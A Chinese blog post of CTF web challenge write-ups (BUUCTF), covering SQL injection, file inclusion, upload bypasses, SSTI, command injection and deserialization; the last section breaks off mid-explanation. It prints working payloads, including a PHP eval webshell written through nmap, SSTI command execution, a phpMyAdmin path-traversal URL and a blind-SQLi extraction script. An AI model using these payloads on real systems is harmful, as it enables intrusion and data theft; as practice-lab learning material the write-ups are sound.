title: web-wp（总）
author: John Doe
date: 2022-12-26 12:19:56
tags:
---
# [极客大挑战 2019]EasySQL1

使用万能公式直接登录

<code>1' or '1'='1</code>
![upload successful](/images/pasted-1.png)

# [HCTF 2018]WarmUp1

![upload successful](/images/pasted-2.png)
右键查看源码，找到source.php

![upload successful](/images/pasted-3.png)
访问 http://41b7e866-9248-40f5-b239-e16d68d39d81.node4.buuoj.cn:81/hint.php


![upload successful](/images/pasted-5.png)
# [极客大挑战 2019]Havefun1

右键查看源码
![upload successful](/images/pasted-6.png)


![upload successful](/images/pasted-7.png)


![upload successful](/images/pasted-8.png)

# [ACTF2020 新生赛]Include1

![upload successful](/images/pasted-9.png)

![upload successful](/images/pasted-10.png)

在flag.php文件中未找到flag，由此推出flag可能被隐藏，构造payload使用base64查看
<code>
  ?file=php://filter/read=convert.base64-encode/resource=flag.php
</code>

![upload successful](/images/pasted-11.png)
得到flag

# [ACTF2020 新生赛]Exec1

![upload successful](/images/pasted-12.png)
判断为命令执行

![upload successful](/images/pasted-13.png)

![upload successful](/images/pasted-14.png)

# [强网杯 2019]随便注1(SQL预编译注入)

![upload successful](/images/pasted-15.png)
存在漏洞

![upload successful](/images/pasted-16.png)

<code>1';show columns from `1919810931114514`# </code>

![upload successful](/images/pasted-561.png)

但是不能用select

使用预编译,concat()出一个'select',然后预编译这条语句，在执行它，构造payload:
{% codeblock lang:PHP %}
set @sql = CONCAT('se','lect * from `1919810931114514`;');
prepare stmt from @sql;
EXECUTE stmt;
{% endcodeblock %}

合在一起就是我们的payload
{% codeblock lang:PHP %}
payload:-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#

=>strstr($inject, "set") && strstr($inject, "prepare")
{% endcodeblock %}

报错，过滤了set和prepare，利用大写绕过

最终payload:
{% codeblock lang:PHP %}
payload:-1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#
{% endcodeblock %}

![upload successful](/images/pasted-562.png)

# [SUCTF 2019]EasySQL
尝试叠堆注入，成功
![upload successful](/images/pasted-18.png)

![upload successful](/images/pasted-19.png)
这里也是没有思路了，看了一下网上师傅的，使用<code>*,1</code>、

![upload successful](/images/pasted-20.png)
成功get flag

通过<code>*,1</code>可以得到flag以及输入1没有返回有用数据，结合网上分析，可以推断后台MySQL语句为

<code>select $post['query']||flag from Flag</code>



# [GXYCTF2019]Ping Ping Ping 1
![upload successful](/images/pasted-21.png)
经过提示，构造payload

![upload successful](/images/pasted-22.png)
使用管道符|，得到

![upload successful](/images/pasted-23.png)
发现过滤空格

![upload successful](/images/pasted-24.png)
对空格进行编码过滤，发现flag也被屏蔽

![upload successful](/images/pasted-25.png)
再次改变payload

![upload successful](/images/pasted-26.png)
查看源码获得flag

![upload successful](/images/pasted-27.png)

# [极客大挑战 2019]Secret File1

![upload successful](/images/pasted-28.png)
查看源码得

![upload successful](/images/pasted-29.png)
点击/Archive_room.php

![upload successful](/images/pasted-30.png)
使用burp抓包，点击SECRET

![upload successful](/images/pasted-31.png)
发送到repeater,GO

![upload successful](/images/pasted-32.png)
浏览器访问http://0a45b8fa-fc8f-444b-8721-8b8c6733f997.node4.buuoj.cn:81/secr3t.php

![upload successful](/images/pasted-33.png)

打开flag.php

![upload successful](/images/pasted-34.png)
回到上个源码页面，还是使用上次的payload
?file=php://filter/convert.base64-encode/resource=flag.php

![upload successful](/images/pasted-35.png)
base64解密得到flag！
# [极客大挑战 2019]LoveSQL1

![upload successful](/images/pasted-40.png)
老样子，登录。
![upload successful](/images/pasted-41.png)
获得admin的密码，再次使用admin登录

![upload successful](/images/pasted-42.png)
网站末尾加'，发现存在sql注入

![upload successful](/images/pasted-43.png)
构造payload，发现有3个order

![upload successful](/images/pasted-44.png)
发现2,3都是回显点，我们使用3进行注入

![upload successful](/images/pasted-46.png)
发现数据库名字叫geek，查找表名。

![upload successful](/images/pasted-47.png)
先看看l0ve1ysq1

![upload successful](/images/pasted-48.png)
构造payload拿下flag

![upload successful](/images/pasted-49.png)
# [极客大挑战 2019]Knife1

![upload successful](/images/pasted-50.png)
说的很清楚，直接上菜刀

![upload successful](/images/pasted-51.png)、
目录找到flag

![upload successful](/images/pasted-52.png)

# [极客大挑战 2019]Http1
经过http提示，先看请求头
![upload successful](/images/pasted-53.png)
查看源码

![upload successful](/images/pasted-54.png)
点击进入Secret.php

![upload successful](/images/pasted-55.png)
使用burp修改referer


![upload successful](/images/pasted-58.png)
提示需要使用Syclover浏览器

![upload successful](/images/pasted-59.png)
提示需在本地打开，继续修改burp数据

![upload successful](/images/pasted-61.png)
成功拿到flag

![upload successful](/images/pasted-63.png)

# [极客大挑战 2019]Upload1

![upload successful](/images/pasted-65.png)
先上传shell试一下

![upload successful](/images/pasted-66.png)
必须是图片，使用burp看看

修改Content-Type为image/png
![upload successful](/images/pasted-67.png)

![upload successful](/images/pasted-83.png)
还是不行，后缀不能是php

使用常见绕过方式逐一尝试

![upload successful](/images/pasted-84.png)
使用到shell.phtml成功上传

![upload successful](/images/pasted-85.png)
蚁剑连接

![upload successful](/images/pasted-86.png)
成功拿到flag

![upload successful](/images/pasted-87.png)

# [ACTF2020 新生赛]Upload1

![upload successful](/images/pasted-88.png)
把鼠标拖到灯泡上，发现上传按键

![upload successful](/images/pasted-89.png)
禁用javascript，burp修改content-type，改后缀

![upload successful](/images/pasted-90.png)
上传成功

![upload successful](/images/pasted-91.png)
蚁剑连接，拿下flag

![upload successful](/images/pasted-92.png)

# [极客大挑战 2019]BabySQL1
尝试万能公式

![upload successful](/images/pasted-93.png)
失败

![upload successful](/images/pasted-94.png)
多次尝试，发现可以使用双写绕过<code>'oorr 1=1#</code>

![upload successful](/images/pasted-95.png)
成功登录，

![upload successful](/images/pasted-96.png)
这里发现or等字符被屏蔽，双写绕过

![upload successful](/images/pasted-97.png)
发现有三个字段,继续注入时发现还有很多字段被屏蔽，均使用双写绕过，找到回显点

![upload successful](/images/pasted-98.png)
双写绕过，得到数据库名

![upload successful](/images/pasted-99.png)
双写得到表名

![upload successful](/images/pasted-100.png)
得到字段

![upload successful](/images/pasted-101.png)
双写，拿下flag

![upload successful](/images/pasted-102.png)

# [极客大挑战 2019]PHP1

![upload successful](/images/pasted-104.png)
猜测网站有备份文件，使用备份目录爆破工具成功找到备份文件


![upload successful](/images/pasted-106.png)
下载

![upload successful](/images/pasted-107.png)
发现是个假flag，打开index.php

![upload successful](/images/pasted-108.png)
看到class.php文件，使用反序列化，打开class.php

![upload successful](/images/pasted-109.png)
分析序列化，使用get传参可以得到flag

![upload successful](/images/pasted-237.png)


# [ACTF2020 新生赛]BackupFile1

![upload successful](/images/pasted-126.png)
扫描后台目录，得到一个index.php.bak，打开

![upload successful](/images/pasted-129.png)
构造网站payload，使得key=123，拿到flag

![upload successful](/images/pasted-130.png)

# [RoarCTF 2019]Easy Calc1

![upload successful](/images/pasted-131.png)
尝试一些办法

![upload successful](/images/pasted-132.png)
![upload successful](/images/pasted-133.png)
查看源码，发现一个php文件

![upload successful](/images/pasted-151.png)
打开

![upload successful](/images/pasted-152.png)
发现是一些关键词检测，没有思路，看了下这个博客
<url>https://blog.csdn.net/tomatoff/article/details/124741084</url>
<url>https://blog.csdn.net/weixin_44077544/article/details/102630714</url>

运用scandir()函数列出根目录有那些文件,使用ASCii的chr(47)绕过对/的检测

构造payload<code>/calc.php? num=2;var_dump(scandir(chr(47)))
</code>

![upload successful](/images/pasted-153.png)
找到了f1agg文件，同样把字母转换成ASCii，打开f1agg文件

构造payload<code>calc.php? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))
</code>

拿到flag

![upload successful](/images/pasted-154.png)

# [极客大挑战 2019]BuyFlag1

![upload successful](/images/pasted-134.png)
查看源码

![upload successful](/images/pasted-135.png)
发现两个php文件，点击pay.php，出现如下页面

![upload successful](/images/pasted-136.png)
点开源码查看，发现

![upload successful](/images/pasted-138.png)
修改user的value为1

![upload successful](/images/pasted-156.png)
用POST请求提交password的money

![upload successful](/images/pasted-157.png)
显示money太长，用数组进行绕过

![upload successful](/images/pasted-158.png)
得到flag

# [护网杯 2018]easy_tornado1

![upload successful](/images/pasted-159.png)
点进去发现三个文件，逐一打开查看

![upload successful](/images/pasted-160.png)
![upload successful](/images/pasted-161.png)
![upload successful](/images/pasted-162.png)
没有发现有用的地址，使用脚本扫描后台看看

![upload successful](/images/pasted-163.png)
![upload successful](/images/pasted-164.png)
扫到/error页面，没有思路

这里参考blog：<url>https://www.cnblogs.com/upfine/p/16580848.html</url>

使用msg参数，构造payload：<code>/error?msg=1</code>

![upload successful](/images/pasted-165.png)
构造payload：<code>/error?msg={{handler.settings}}</code>

![upload successful](/images/pasted-166.png)
根据公式<code>md5(cookie_secret+md5(filename))</code>使用MD5加密得到

![upload successful](/images/pasted-168.png)
构造payload：<code>/file?filename=/fllllllllllllag&filehash=44e0bf9b827a45dad7ca6587ab158424</code>

![upload successful](/images/pasted-169.png)
成功拿到flag

# [BJDCTF2020]Easy MD51

![upload successful](/images/pasted-189.png)
没有信息，使用burp抓包查看

![upload successful](/images/pasted-190.png)
在Headers中发现一条sql执行语句<code>select * from 'admin' where password=md5($pass,true)</code>

使用万能密码<code>ffifdyop</code>，成功进入

![upload successful](/images/pasted-191.png)
查看源代码

![upload successful](/images/pasted-192.png)
构造payload<code>?a[]=1&b[]=2</code>，使用数组绕过，进入以下界面

![upload successful](/images/pasted-193.png)
同样使用数组绕过，拿到flag

![upload successful](/images/pasted-195.png)

# [HCTF 2018]admin1

第一种方法：

![upload successful](/images/pasted-196.png)
右上角注册，注册时候发现admin账号存在，使用admin123注册成功并登录

![upload successful](/images/pasted-197.png)
这里发现一个修改密码的界面，不需要输入旧的密码

![upload successful](/images/pasted-198.png)
源码里发现一个网站，访问看一下

![upload successful](/images/pasted-199.png)

![upload successful](/images/pasted-202.png)
发现秘钥为ckj123，使用seession解密脚本，对加密的seession进行解密

![upload successful](/images/pasted-201.png)
拿到解密后的seession<code>{'_fresh': True, '_id': b'23652ee3a8354328aa26820baf578bde5781ef8e2c2db0914603d70a4e9bdb5a1c6528a108f78e5fab834ed5adbfa18bb0e5b799ea20fe61114949761bd91107', 'csrf_token': b'795a1176c19099968e5fd9e7e2908dcf366b9974', 'image': b'Dzav', 'name': 'admin123', 'user_id': '10'}</code>

修改name的内容为admin，加密

![upload successful](/images/pasted-203.png)
得到新的seession<code>.eJw9kMtuwkAMRX-l8ppFHrBBYlEUSBPJHhU5jWY2iELIPDK0CiBoEP_eKZVYeXHsc23fYL3vm6OG6ak_NyNYmx1Mb_DyCVNAiwlx2SkmLTKMKcMfkS81WjlGOzeyljEN2qi8CrW9qlqOFZcW_cpg5q6UyQsm7ynmi0hxF_qKWPLSkq2CZ3HFTPsw31GttLTtQPmHo3rppFcaWRtp54EVqeCuk1xclK8S5EXwukjwNsG6dIL_PNsZ3EewPfb79enLNYfnCTS4EBlGBmWR3UWwm5B9RDpRV6niYhLWcDKRA1llAk_pdfbQGb9pm6dp9fatd-0_OWx8ALDZeXOAEZyPTf_4G8QR3H8BwxhuFg.Y33hBA.e0p80Glp9UcgrtbhacRbddz3B48</code>

使用burp发送上去

![upload successful](/images/pasted-204.png)
修改密码，拿下flag

![upload successful](/images/pasted-205.png)

第二种方法：Unicode欺骗

查看github下载的文件，发现如下函数

![upload successful](/images/pasted-206.png)

<code>name = strlower(session['name'])</code>

login的时候会经过一次strlower会编程ADMIN,在change password的时候会变成admin。因此可以更改admin的密码，从而完成登录。

<code>ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ</code>

使用<code>ᴬᴰᴹᴵᴺ</code>注册

![upload successful](/images/pasted-207.png)
注册成功，修改密码,然后使用admin登录，拿下flag

![upload successful](/images/pasted-208.png)




# [MRCTF2020]你传你🐎呢1

![upload successful](/images/pasted-144.png)
先直接上传.php，修改type查看

![upload successful](/images/pasted-145.png)

![upload successful](/images/pasted-146.png)
失败，修改后缀<code>php,php3,php4,php5,phtml.pht</code>尝试
![upload successful](/images/pasted-146.png)
发现都不可以，试试.htaccess

![upload successful](/images/pasted-147.png)
长传成功，接着上传.htaccess里写的shell1.png

![upload successful](/images/pasted-148.png)
上传成功，尝试用蚁剑连接

![upload successful](/images/pasted-149.png)
成功，拿到flag

![upload successful](/images/pasted-150.png)

# [SUCTF 2019]CheckIn1

![upload successful](/images/pasted-210.png)
打开靶机，发现是一个文件上传页面，提交一个.php试试

![upload successful](/images/pasted-211.png)
果然不行，这里尝试png发现是可以提交的

![upload successful](/images/pasted-212.png)
提交.htaccess

![upload successful](/images/pasted-213.png)
不行，尝试.user.ini

![upload successful](/images/pasted-214.png)
成功上传，使用蚁剑连接

![upload successful](/images/pasted-215.png)
拿下flag

![upload successful](/images/pasted-216.png)

# [MRCTF2020]Ez_bypass1

![upload successful](/images/pasted-217.png)
打开页面，没什么可读性，打开源码查看

![upload successful](/images/pasted-218.png)
经过源码提示，使用hackbar，利用md5无法比较数组绕过md5校验，看到<code>==</code>，使用1234567a绕过函数<code>!is_numeric()</code>对1234567的检测

![upload successful](/images/pasted-219.png)
拿到flag！



# [GXYCTF2019]BabySQli1

![upload successful](/images/pasted-172.png)
使用变形的万能钥匙<code>1' Or '1' && '1</code>

![upload successful](/images/pasted-173.png)

![upload successful](/images/pasted-174.png)

![upload successful](/images/pasted-175.png)
报错，故有三个字段，猜测2有回显

![upload successful](/images/pasted-176.png)

![upload successful](/images/pasted-177.png)
确定2有回显，没有思路了，看了一下别人的blog

<code>第二个位置传递username，那传password的位置便在1和3之间， 接下里就是要绕过密码的MD5验证，需要把我们输入的值和数据库里面存放的用户密码的MD值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据。生成6的MD5值，构造payload进行尝试，当构造1' union select 1,'admin','1679091c5a880faf6fb5e6087eb1b2dc'#&pw=6</code>

构造payload：<code>1' union select 1,'admin','c4ca4238a0b923820dcc509a6f75849b'#&pw=1</code>,拿下flag

![upload successful](/images/pasted-178.png)

# [GXYCTF2019]BabyUpload1

![upload successful](/images/pasted-179.png)
将shell改名为222.jpg文件，上传成功。

![upload successful](/images/pasted-180.png)

![upload successful](/images/pasted-182.png)

改type上传.htaccess成功，蚁剑连接，拿下flag

![upload successful](/images/pasted-184.png)

# [GYCTF2020]Blacklist1


![upload successful](/images/pasted-220.png)
尝试payload<code>1'</code>，发现注入

![upload successful](/images/pasted-221.png)
使用联合注入，发现存在过滤

使用叠堆注入
![upload successful](/images/pasted-223.png)
![upload successful](/images/pasted-222.png)
![upload successful](/images/pasted-224.png)
发现flag被过滤，使用handler绕过
<code>
HANDLER … OPEN语句打开一个表
HANDLER … READ语句访问
HANDLER … CLOSE关闭一个表
</code>  

![upload successful](/images/pasted-225.png)
拿到flag

# [CISCN2019 华北赛区 Day2 Web1]Hack World1

![upload successful](/images/pasted-226.png)
经过题目提示，此题为PHP和SQL注入

![upload successful](/images/pasted-227.png)
![upload successful](/images/pasted-228.png)
发现只有输入1或2的时候存在回显

![upload successful](/images/pasted-229.png)
3或其他则显示如上所示

![upload successful](/images/pasted-230.png)
使用flag长度测试脚本，发现为42

使用脚本成功爆破

![upload successful](/images/pasted-231.png)

所用到的py源码：

<code>
import requests

url = "http://705f0cba-883e-4d3b-b160-ad6ddefa01de.node4.buuoj.cn:81/index.php"
len = 1;
while(True):
    data = {"id": f"if(length((select(flag)from(flag)))={len},1,0)"}
    r = requests.post(url,data=data)
    if('Hello, glzjin wants a girlfriend.' in r.text):
        break;
    print(len,end='\n')
    len += 1
print(f"flag长度为{len}")

</code>

<code>
import requests
import time

url = "http://705f0cba-883e-4d3b-b160-ad6ddefa01de.node4.buuoj.cn:81/index.php"
flag = ''

for x in range(1,43):
    left = 33
    right = 126
    while(right > left):
        mid = int((left + right + 1) / 2)
        data = {'id':f"if(ascii(substr((select(flag)from(flag)),{x},1))>={mid},1,0)"}
        r = requests.post(url,data=data)
        if('Hello, glzjin wants a girlfriend.' in r.text):
            left = mid
        else:
            right = mid - 1
        time.sleep(0.1)
    flag += chr(right)
    print(flag)

print(f"flag为{flag}")

</code>

# [网鼎杯 2018]Fakebook1（未解出）

![upload successful](/images/pasted-232.png)
进入页面，Facebook？发现登录和加入按键，使用admin加入

![upload successful](/images/pasted-233.png)
首页发生变化，在url中发现注入点

![upload successful](/images/pasted-235.png)
尝试sqlmap，没嗦出来

![upload successful](/images/pasted-236.png)
看大佬的wp，没理解，先空着！
# [RoarCTF 2019]Easy Java1

![upload successful](/images/pasted-238.png)
点击help看看

![upload successful](/images/pasted-239.png)
根据CSDN博客，得知此网站漏洞利用方法

![upload successful](/images/pasted-240.png)

<code>
漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！
</code>
故访问url（POST提交）:<code>http://2d82cb0a-b91d-4bfe-b11d-c19974a84ea9.node4.buuoj.cn:81/Download?filename=WEB-INF/web.xml</code>

![upload successful](/images/pasted-241.png)
发现类似flag的文件

![upload successful](/images/pasted-242.png)
发现路径，读取<code>*/Download?filename=WEB-INF/classes/com/wm/ctf/FlagController.class 
</code>

![upload successful](/images/pasted-243.png)
base64解密得到flag

# [BJDCTF2020]The mystery of ip1


![upload successful](/images/pasted-244.png)
访问页面

![upload successful](/images/pasted-245.png)
这里显示了一个ip，不是自己的，使用burp抓包添加请求头<code>X-Forwarded-For:1.1.1.1</code>

![upload successful](/images/pasted-247.png)
发现这里IP直接显示1.1.1.1，推测可能存在模板注入。将XFF改为<code>{{system('ls /')}}</code>

![upload successful](/images/pasted-248.png)
成功ls出服务器的目录，随后
  
<code>xff={{system('ls /')}}</code>
  
<code>xff={{system('cat /flag')}} </code>

![upload successful](/images/pasted-249.png)
成功拿下flag

# [BUUCTF 2018]Online Tool1

![upload successful](/images/pasted-250.png)
上来直接就给源码，分析一下，应该使用nmap分析输入的host；

![upload successful](/images/pasted-251.png)
使用?host=ip，分析了一下自己的服务器

这里找到了一个相关的函数解释：

函数escapeshellarg的作用是把字符串转码为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

函数escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。

反斜线（\）会在以下字符之前插入： &#;`|*?~<>^()[]{}$, \x0A 和 \xFF。 ’ 和 " 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。

例如 ads’ escapeshellarg 首先 ‘ads’‘’’ 加单引号并对字符串中单引号进行转义 escapeshellcmd()会对\进行转义并对不配对的值进行转义，‘ads’\‘’‘最后为ads’

`

扩展：<code>-oG xxx.php</code>   是nmap上传文件的命令，故利用nmap上传一句话

构造payload:<code>?host='<?php eval($_POST[1]);?> -oG shell.php ’</code>

![upload successful](/images/pasted-252.png)
成功上传，使用蚁剑连接，拿下flag！

![upload successful](/images/pasted-253.png)

![upload successful](/images/pasted-254.png)

# [网鼎杯 2020 朱雀组]phpweb1

![upload successful](/images/pasted-255.png)
一进去就报错，使用yakit抓包试试

![upload successful](/images/pasted-256.png)
在func那里试一试注入

![upload successful](/images/pasted-257.png)
果然，被绕过，可能存在过滤，使用md5试试

![upload successful](/images/pasted-258.png)
成功，发现确实存在过滤，csdn搜索php内置函数，可以获取文件的函数<code>file_get_contents</code>读取整个文件内容

![upload successful](/images/pasted-259.png)
这里读取到了后端的过滤代码，知道了过滤的，对其进行绕过

![upload successful](/images/pasted-260.png)
构造<code>func=\system&p=find / -name flag*</code>进行查找

![upload successful](/images/pasted-261.png)
没找到，逐个根目录找，在/tmp发现了

![upload successful](/images/pasted-262.png)
直接cat，拿到flag

![upload successful](/images/pasted-263.png)

# [GXYCTF2019]禁止套娃1

![upload successful](/images/pasted-264.png)
进去，什么都没有

![upload successful](/images/pasted-265.png)
抓包，无可用数据，使用dirsearch找一下目录，也没有任何收获，尝试githack扫描是否源码泄露

![upload successful](/images/pasted-266.png)
确认是.git源码泄露，打开进行代码审计。

![upload successful](/images/pasted-267.png)
过滤了很多，看了一下CSDN上别人的解法

构造payload:
<code>/?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code>

![upload successful](/images/pasted-268.png)
拿到flag

原理：loacleconv 函数会固定返回一个 <code>.</code> 然后pos将我们获得的 .返回到我们构造的 payload 使得 scandir能够返回当前目录下的数组（换句话说，就是读出当前目录下的文件） rray_reverse()以相反的顺序输出（目的是以正序输出查询出来的内容）然后 next 提取第二个元素（将<code>.</code>过滤出去），最后用highlight_file()给显示出来。

# [BSidesCF 2020]Had a bad day1

![upload successful](/images/pasted-270.png)
进去看了下，类似于一个图片生成网站，使用dirsearch扫描目录

![upload successful](/images/pasted-269.png)
发现/flag.php，访问一下

![upload successful](/images/pasted-271.png)
打开是个空白页面，前端源码显示  !-- Can you read this flag? --

![upload successful](/images/pasted-272.png)
点左边按钮显示的都是狗，点右边按钮显示的都是猫，注意到url是使用get提交的，编写php伪协议试试

![upload successful](/images/pasted-273.png)
发现报错了，看报错信息发现index.php.php，两个.php，

使用payload:<code>/index.php?category=php://filter/read=convert.base64-encode/resource=index
</code>

![upload successful](/images/pasted-274.png)
使用base64解密得到网页中的php代码，尝试伪协议读取flag:<code>/index.php?category=php://filter/read=convert.base64-encode/resource=flag
</code>

![upload successful](/images/pasted-275.png)
没有显示flag，审查刚刚的php源码，可以发现当get传入的参数不包含"woofers"、“meowers”、“index"则会跳转到else，所以无法直接读取，必须在变量中插入"woofers”、“meowers”、“index”

payload:<code>category=php://filter/read=convert.base64-encode/index/resource=flag
</code>

![upload successful](/images/pasted-276.png)
拿到flag

# [BJDCTF2020]ZJCTF，不过如此1

![upload successful](/images/pasted-277.png)
打开网页，发现部分源码，分析需要对将I have a dream写入text中，在这里我们使用代码

<code>?text = data://text/plain,I have a dream</code>

故构造payload:<code>http://4d13bfcf-007d-413d-b3d0-56e680f91582.node4.buuoj.cn:81/?text=data://text/plain,I%20have%20a%20dream&file=next.php</code>

![upload successful](/images/pasted-278.png)
next.php内容没有显示，使用base64加密

![upload successful](/images/pasted-279.png)
成功读取到了next.php，代码审计发现使用GET传参了一个参数id，看CSDN上说存在preg_replace() /e漏洞，详细参考:<a herf=https://blog.csdn.net/weixin_43749601/article/details/113417093?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165209725916782425126363%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165209725916782425126363&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-3-113417093-null-null.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Econtrol&utm_term=Preg_Replace%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E&spm=1018.2226.3001.4187>preg_replace() /e代码执行漏洞</a>（点击进查看漏洞解析）

在这里我们利用该漏洞直接上传\s*参数，因为上传其他的参数会被解析过滤，而\s是表示匹配非空格以外的所有字符，所以构造payload:<code>http://4d13bfcf-007d-413d-b3d0-56e680f91582.node4.buuoj.cn:81/next.php?\S**=${getFlag()}&cmd=system(%27ls%20/%27);</code>

![upload successful](/images/pasted-280.png)
得到根目录，继续构造payload:<code>http://4d13bfcf-007d-413d-b3d0-56e680f91582.node4.buuoj.cn:81/next.php?\S*=${getFlag()}&cmd=system(%27cat%20/flag%27);</code>

![upload successful](/images/pasted-284.png)
拿到flag

# [GWCTF 2019]我有一个数据库1

![upload successful](/images/pasted-286.png)
打开直接乱字符，源码也没有可读性，使用dirsearch爆破网站目录，发现了index.php,phpmyadmin, phpinofo以及root.txt
![upload successful](/images/pasted-287.png)
![upload successful](/images/pasted-288.png)
只有phpmyadmin提供了一些可能有用的信息

![upload successful](/images/pasted-289.png)
没有任何思路，在CSDN上查找是在该版本的 phpmyadmin 存在框架代码漏洞

![upload successful](/images/pasted-290.png)
该版本的 phpmyadmin 存在的框架代码漏洞:<code>
$target_blacklist = array (
    'import.php', 'export.php'
);

// If we have a valid target, let's load that script instead
if (! empty($_REQUEST['target'])
    && is_string($_REQUEST['target'])
    && ! preg_match('/^index/', $_REQUEST['target'])
    && ! in_array($_REQUEST['target'], $target_blacklist)
    && Core::checkPageValidity($_REQUEST['target'])
) {
    include $_REQUEST['target'];
    exit;
}


</code>

满足以下五个条件就会进行文件包含（<code>include $_REQUEST['target'];</code>）

<code>$_REQUEST['target']</code> 不为空

<code>$_REQUEST['target']</code>参数携带的内容是字符串

<code>$_REQUEST['target']</code>不以index开头

<code>$_REQUEST['target']</code>搜索数组$target_blacklist 中不存在指定的值（ ‘import.php’, ‘export.php’）

<code>Core::checkPageValidity($_REQUEST['target'])</code>为真 具体要看 后面的代码

只要满足这五点我们就可以获得falg

如果w h i t e l i s t 未 传 参 ， 就 会 被 赋 值 为 ‘ whitelist未传参，就会被赋值为`whitelist未传参，就会被赋值为‘goto_whitelist`

构造payload:<code>http://5b521c14-90f1-4004-bdb6-7b32a43fd435.node4.buuoj.cn:81/phpmyadmin/index.php?target=db_datadict.php%253f/../../../../../../../../flag</code>

![upload successful](/images/pasted-292.png)
拿到flag

# [NCTF2019]Fake XML cookbook1

![upload successful](/images/pasted-293.png)
尝试了一下弱口令，登录失败了，题目提示是XML了，抓包看一下

![upload successful](/images/pasted-294.png)
猜测可能是要使用XXE攻击，构造payload:

![upload successful](/images/pasted-295.png)
拿下flag

# [WUSTCTF2020]朴实无华1

![upload successful](/images/pasted-302.png)
进入网页，没有什么有用信息，使用dirsearch扫描后台

![upload successful](/images/pasted-303.png)
成功扫描到一个目录，点进去

![upload successful](/images/pasted-304.png)
又发现一个目录，点进去

![upload successful](/images/pasted-305.png)
不是flag，抓包看看

![upload successful](/images/pasted-306.png)
发现一个/fl4g.php

![upload successful](/images/pasted-307.png)
打开发现代码编码格式可能错误

![upload successful](/images/pasted-308.png)
成功修复，代码审计发现有三个if需要绕过，逐一绕过。

这里在CSDN搜了一下绕过方式：<code>intval函数，此函数在处理数据时会在接触到字符串时停止，也就是说如果传入1e4(10000),经函数解析后会变为1，但是你在+1之后会变为10001，就能成功绕过</code>

故传入<code>?num=1e4</code>

![upload successful](/images/pasted-309.png)
OK，看第二个绕过。这里就只需找到一个以0x开头的字符串,并且md5加密后也以0x开头的字符串。传入<code>&md5=0e215962017</code>

![upload successful](/images/pasted-310.png)
成功，看第三个，传参<code>&get_flag=ls</code>，看一下目录

![upload successful](/images/pasted-311.png)
发现一些绕过，看之前的笔记，构造最终payload:<code>/?num=1e4&md5=0e215962017&get_flag=more＜fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag</code>（此处＜为<），拿到flag。

![upload successful](/images/pasted-312.png)

# [BJDCTF2020]Cookie is so stable1

![upload successful](/images/pasted-313.png)
抓个包看看，

![upload successful](/images/pasted-314.png)
点进入到flag页面。输入1，返回1

![upload successful](/images/pasted-315.png)
尝试SSTI注入，构造payload进行尝试.

![upload successful](/images/pasted-316.png)
![upload successful](/images/pasted-317.png)
OK，发现存在SSTI注入，直接构造payload:<code>{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}</code>

![upload successful](/images/pasted-318.png)
发现存在过滤，抓取一个登录的包

![upload successful](/images/pasted-319.png)
发现注入点在cookie里

![upload successful](/images/pasted-320.png)
拿下flag

# [强网杯 2019]高明的黑客1

![upload successful](/images/pasted-321.png)
一进去，直接爆出目录，访问下载

![upload successful](/images/pasted-322.png)
发现三千个文件需要代码审计，这里在网上找了一个python脚本

![upload successful](/images/pasted-323.png)
拿下flag

# [ASIS 2019]Unicorn shop1

![upload successful](/images/pasted-324.png)
进入网站，发现是一个购物网站，输入ID和价格就可以购买，尝试注入，
![upload successful](/images/pasted-325.png)
发现了一点点报错，显示必须是char类型

![upload successful](/images/pasted-327.png)
额，这里直接flag出来了，在网上看一下为什么，给出的解释是：直接用中文的大于1337.0的一个字符，
（万、亿）都可以购买：

![upload successful](/images/pasted-328.png)
这里显示 You don't have enough money!  在查找unicode字符的网站，找到大于商品的价格的字符。

![upload successful](/images/pasted-329.png)
<code>0xE2 0x86 0x82</code>因为是utf-8，所以把0x换为%<code>%E2%86%82</code>

![upload successful](/images/pasted-330.png)
成功拿下flag

# [MRCTF2020]Ezpop1

![upload successful](/images/pasted-331.png)
这里一进去发现是要审查源码，对源码进行分析，

首先我们看到include($value);这就是我们要获取flag的根本函数

并且提示flag在flag.php里面所有，就可以利用php://filter协议读取
flag.

所以我们的目标是要调用include函数，就要调用append方法，要调append()方法就要通过__invoke()，\__invoke()是当类被作为函数调用时触发。

所以我们要调\__invoke()方法，就要Modifier被作为函数调用，可以通过Test类的\__get方法把p传入Modifier对象作为函数调用。

